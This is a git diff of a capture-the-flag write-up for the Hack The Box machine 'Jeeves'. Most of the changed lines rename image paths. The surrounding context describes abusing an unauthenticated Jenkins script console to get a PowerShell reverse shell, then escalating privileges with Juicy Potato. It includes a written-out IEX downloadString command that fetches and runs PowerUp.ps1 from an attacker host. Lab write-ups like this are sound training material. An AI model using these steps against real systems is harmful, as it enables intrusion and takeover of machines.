@@ -1,6 +1,6 @@
 # Jeeves
 
-![](<../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1).png>)
 
 ## Reconnaissance <a href="#491d" id="491d"></a>
 
@@ -75,11 +75,11 @@ gobuster dir -u http://10.129.174.184:50000 -w /usr/share/wordlists/dirbuster/di
 
 Looking at the http site we are presented with a search bar
 
-![](<../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
 Searching takes you to error.html which turns out to just be an image
 
-![error.html](<../../../.gitbook/assets/image (17) (1).png>)
+![error.html](<../../../.gitbook/assets/image (17) (1) (1).png>)
 
 Source code for site, the action results in error.html
 
@@ -107,7 +107,7 @@ Source code for site, the action results in error.html
 
 Quickly checking gobuster for jetty shows that we have a directory to check out
 
-![/askjeeves](<../../../.gitbook/assets/image (16).png>)
+![/askjeeves](<../../../.gitbook/assets/image (16) (1).png>)
 
 Going there we see Jenkins!
 
@@ -115,7 +115,7 @@ Going there we see Jenkins!
 
 Turns out we have command execution without needing to be logged in which works in our favor
 
-![](<../../../.gitbook/assets/image (7).png>)
+![](<../../../.gitbook/assets/image (7) (1).png>)
 
 ## Initial Access
 
@@ -127,11 +127,11 @@ First we want to copy the example to the bottom of the script so that it is run 
 
 ![](<../../../.gitbook/assets/image (10).png>)
 
-![](<../../../.gitbook/assets/image (6).png>)
+![](<../../../.gitbook/assets/image (6) (1).png>)
 
 Next we want to get a web server running and a netcat listener to catch the reverse shell. In this se I am using [updog](https://github.com/sc0tfree/updog) for my simple web server.
 
-![](<../../../.gitbook/assets/image (12) (1).png>)
+![](<../../../.gitbook/assets/image (12) (1) (1).png>)
 
 Using the script console again I run this command to download and execute the invoke powershell tcp reverse shell script
 
@@ -139,7 +139,7 @@ Using the script console again I run this command to download and execute the in
 
 And we get a shell back!
 
-![](<../../../.gitbook/assets/image (14).png>)
+![](<../../../.gitbook/assets/image (14) (1).png>)
 
 This allows us to get user.txt!
 
@@ -160,7 +160,7 @@ IEX(New-Object Net.WebCLient).downloadString('http://10.10.14.92/PowerUp.ps1')
 Invoke-AllChecks # This runs the powershell function to check everything
 ```
 
-![](<../../../.gitbook/assets/image (2).png>)
+![](<../../../.gitbook/assets/image (2) (1).png>)
 
 Right away we see SeImpersonatePrivilege which means this box is vulnerable to Juicy Potato!
 
@@ -202,7 +202,7 @@ When we try and take a look at the administrators desktop we see hm.txt with an 
 
 Then I tried this
 
-![Alternate Data Streams](<../../../.gitbook/assets/image (9) (1) (1).png>)
+![Alternate Data Streams](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
 
 Alternate Data Streams, find more about them here
 
